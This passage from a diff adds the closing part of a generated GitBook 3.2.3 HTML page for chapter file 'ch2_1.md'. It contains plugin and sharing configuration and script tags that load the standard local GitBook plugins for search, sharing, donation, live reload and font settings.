fa-navicon","showLevelIcon":false,"level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right"},"pageTop":{"showLevelIcon":false,"level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right"}},"variables":{},"gitbook":"*","sharing":{"qq":true,"all":["facebook","google","twitter","weibo","qq","linkedin","qzone","douban"],"douban":false,"facebook":false,"weibo":true,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":true,"linkedin":false}},"file":{"path":"ch2_1.md","mtime":"2019-04-05T15:08:09.651Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-04-05T15:08:17.210Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
